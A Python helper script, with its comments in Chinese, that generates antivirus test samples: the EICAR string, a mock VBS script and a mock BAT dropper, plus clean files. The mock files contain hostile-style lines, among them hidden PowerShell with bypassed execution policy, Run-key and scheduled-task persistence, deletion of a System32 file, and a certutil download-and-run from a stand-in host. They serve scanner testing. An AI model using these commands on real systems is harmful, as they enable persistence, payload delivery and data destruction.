# -*- coding: utf-8 -*-
"""生成演示/测试样本到 tests/sample/，用于验证杀毒软件功能。
用法: python scripts/make_samples.py
生成内容:
  eicar.com              -> EICAR 标准测试文件（应被哈希特征库检出）
  fake_malware.vbs       -> 模拟恶意 VBS 脚本（应被启发式检出）
  fake_dropper.bat       -> 模拟下载器 BAT（应被启发式检出）
  clean_hello.py         -> 正常 Python 脚本（应被判定安全）
  clean_note.txt         -> 正常文本（应被判定安全）
"""
import sys
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent
SAMPLE = BASE / "tests" / "sample"
SAMPLE.mkdir(parents=True, exist_ok=True)

EICAR_BYTES = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'


def main():
    (SAMPLE / "eicar.com").write_bytes(EICAR_BYTES)

    (SAMPLE / "fake_malware.vbs").write_text(
        'Set ws = CreateObject("WScript.Shell")\n'
        'Set fso = CreateObject("Scripting.FileSystemObject")\n'
        'ws.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -enc AAAA", 0\n'
        'fso.DeleteFile "C:\\Windows\\System32\\evil.dll"\n'
        'ws.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\mal", "x"\n',
        encoding="utf-8",
    )

    (SAMPLE / "fake_dropper.bat").write_text(
        '@echo off\n'
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v up /d "evil.exe" /f\n'
        'schtasks /create /tn "upd" /tr "powershell -w hidden -enc AAA" /sc onlogon\n'
        'certutil -urlcache -split -f http://evil.example.com/a.exe %TEMP%\\a.exe\n'
        'start %TEMP%\\a.exe\n',
        encoding="utf-8",
    )

    (SAMPLE / "clean_hello.py").write_text(
        'print("Hello, this is a normal script.")\n'
        'total = sum(x for x in range(100))\n'
        'print(total)\n',
        encoding="utf-8",
    )

    (SAMPLE / "clean_note.txt").write_text(
        "这是一份普通的笔记文件。\n今天天气不错，适合写代码。\n",
        encoding="utf-8",
    )

    for f in SAMPLE.iterdir():
        print(f"[生成] {f}")
    print(f"\n样本目录: {SAMPLE}")
    print("现在打开 ShieldPy 对此目录进行自定义扫描，即可验证：")
    print("  eicar.com       -> 应检出（哈希特征）")
    print("  fake_malware.vbs -> 应检出（启发式）")
    print("  fake_dropper.bat -> 应检出（启发式）")
    print("  clean_*.py/.txt -> 应判定安全")
    return 0


if __name__ == "__main__":
    sys.exit(main())
